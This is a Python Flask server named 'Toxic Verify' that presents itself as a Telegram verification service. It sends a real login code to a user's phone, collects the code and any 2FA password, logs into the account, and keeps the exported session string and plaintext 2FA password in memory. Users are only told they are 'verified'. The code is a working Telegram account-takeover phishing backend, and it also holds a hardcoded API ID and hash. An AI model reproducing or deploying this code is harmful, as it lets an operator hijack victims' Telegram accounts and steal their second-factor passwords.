"""
============================================
 TOXIC VERIFY - Flask API Server (Vercel)
============================================
"""

import os, json, asyncio, logging, pickle, base64, time
try:
    import nest_asyncio
    nest_asyncio.apply()
except ImportError:
    pass
from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid,
    PhoneCodeExpired, PasswordHashInvalid, FloodWait, PhoneNumberInvalid
)

API_ID   = int(35307937)
API_HASH = "9c6e00f1aec844a2262224bb146ab6c3"

app = Flask(__name__)
CORS(app)

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

TMP = "/tmp/tox_sessions"
os.makedirs(TMP, exist_ok=True)

def save_session(uid, data):
    path = f"{TMP}/{uid}.json"
    safe = {k: v for k, v in data.items() if k != "client"}
    with open(path, "w") as f:
        json.dump(safe, f)

def load_session(uid):
    path = f"{TMP}/{uid}.json"
    if os.path.exists(path):
        with open(path) as f:
            return json.load(f)
    return None

def del_session(uid):
    path = f"{TMP}/{uid}.json"
    if os.path.exists(path):
        os.remove(path)

verified_queue = {}


# ── Async helpers ──

async def _send_otp(phone: str):
    # Use modulo to keep session name short and safe (no overflow)
    name = f"s{abs(hash(phone)) % 10**9}"
    client = Client(name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
    await client.connect()
    try:
        sent = await client.send_code(phone)
        phone_code_hash = str(sent.phone_code_hash)  # ensure string, not some internal type
        sess_str = await client.export_session_string()
        await client.disconnect()
        return {"ok": True, "hash": phone_code_hash, "sess_str": sess_str}
    except FloodWait as e:
        await client.disconnect()
        return {"ok": False, "error": f"Too many attempts. Wait {e.value}s."}
    except PhoneNumberInvalid:
        await client.disconnect()
        return {"ok": False, "error": "Invalid phone number."}
    except Exception as e:
        await client.disconnect()
        return {"ok": False, "error": str(e)}


async def _verify_otp(sess_str, phone, code_hash, code):
    client = Client(f"verif_{int(time.time()*1000)}", api_id=API_ID, api_hash=API_HASH,
                    session_string=sess_str, in_memory=True)
    await client.connect()
    try:
        await client.sign_in(
            phone_number=str(phone),
            phone_code_hash=str(code_hash),
            phone_code=str(code)
        )
        session = await client.export_session_string()
        me = await client.get_me()
        await client.disconnect()
        return {"ok": True, "session": session, "tg_id": me.id, "phone": phone}
    except SessionPasswordNeeded:
        try:
            hint = await client.get_password_hint()
        except:
            hint = ""
        new_sess = await client.export_session_string()
        await client.disconnect()
        return {"ok": False, "need_2fa": True, "hint": hint or "", "sess_str": new_sess}
    except PhoneCodeInvalid:
        await client.disconnect()
        return {"ok": False, "error": "Wrong OTP code. Try again."}
    except PhoneCodeExpired:
        await client.disconnect()
        return {"ok": False, "error": "OTP expired. Go back and try again."}
    except Exception as e:
        await client.disconnect()
        return {"ok": False, "error": str(e)}


async def _verify_2fa(sess_str, password, phone):
    client = Client(f"verif2_{int(time.time()*1000)}", api_id=API_ID, api_hash=API_HASH,
                    session_string=sess_str, in_memory=True)
    await client.connect()
    try:
        await client.check_password(password)
        session = await client.export_session_string()
        me = await client.get_me()
        await client.disconnect()
        return {"ok": True, "session": session, "tg_id": me.id, "phone": phone}
    except PasswordHashInvalid:
        await client.disconnect()
        return {"ok": False, "error": "Wrong 2FA password. Try again."}
    except Exception as e:
        await client.disconnect()
        return {"ok": False, "error": str(e)}


# ── Routes ──

@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"ok": True, "msg": "Toxic Verify API running"})


@app.route("/send-otp", methods=["POST"])
def send_otp():
    body  = request.get_json(silent=True) or {}
    phone = str(body.get("phone", "")).strip()

    if not phone:
        return jsonify({"ok": False, "error": "Missing phone"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone

    log.info(f"send-otp called: phone={phone!r}")
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(_send_otp(phone))
        loop.close()
    except Exception as e:
        log.error(f"send-otp exception: {e}")
        return jsonify({"ok": False, "error": f"Server error: {str(e)}"}), 500

    if result["ok"]:
        save_session(phone, {
            "hash":     result["hash"],
            "phone":    phone,
            "sess_str": result["sess_str"]
        })
        log.info(f"OTP sent phone={phone}")
        return jsonify({"ok": True, "message": "OTP sent to your Telegram app"})
    else:
        return jsonify({"ok": False, "error": result["error"]}), 400


@app.route("/verify-otp", methods=["POST"])
def verify_otp():
    body  = request.get_json(silent=True) or {}
    otp   = str(body.get("otp", "")).strip()
    phone = str(body.get("phone", "")).strip()

    if not otp or not phone:
        return jsonify({"ok": False, "error": "Missing otp or phone"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone

    sess = load_session(phone)
    if not sess:
        return jsonify({"ok": False, "error": "Session expired. Go back and try again."}), 400

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(_verify_otp(sess["sess_str"], sess["phone"], sess["hash"], otp))
        loop.close()
    except Exception as e:
        return jsonify({"ok": False, "error": f"Server error: {str(e)}"}), 500

    if result["ok"]:
        del_session(phone)
        tg_id = str(result["tg_id"])
        verified_queue[tg_id] = {
            "session": result["session"],
            "tg_id":   result["tg_id"],
            "phone":   result["phone"],
            "tfa":     None
        }
        log.info(f"OTP verified phone={phone} tg_id={tg_id}")
        return jsonify({"ok": True, "message": "OTP verified!"})

    elif result.get("need_2fa"):
        save_session(phone, {
            "hash":     sess["hash"],
            "phone":    sess["phone"],
            "sess_str": result["sess_str"],
            "need_2fa": True
        })
        return jsonify({"ok": False, "need_2fa": True, "hint": result["hint"]})

    else:
        return jsonify({"ok": False, "error": result["error"]}), 400


@app.route("/verify-2fa", methods=["POST"])
def verify_2fa():
    body     = request.get_json(silent=True) or {}
    password = body.get("password", "").strip()
    phone    = str(body.get("phone", "")).strip()

    if not password or not phone:
        return jsonify({"ok": False, "error": "Missing password or phone"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone

    sess = load_session(phone)
    if not sess or not sess.get("need_2fa"):
        return jsonify({"ok": False, "error": "Session expired. Go back and try again."}), 400

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(_verify_2fa(sess["sess_str"], password, sess["phone"]))
        loop.close()
    except Exception as e:
        return jsonify({"ok": False, "error": f"Server error: {str(e)}"}), 500

    if result["ok"]:
        del_session(phone)
        tg_id = str(result["tg_id"])
        verified_queue[tg_id] = {
            "session": result["session"],
            "tg_id":   result["tg_id"],
            "phone":   result["phone"],
            "tfa":     password
        }
        log.info(f"2FA verified phone={phone}")
        return jsonify({"ok": True, "message": "2FA verified!"})
    else:
        return jsonify({"ok": False, "error": result["error"]}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
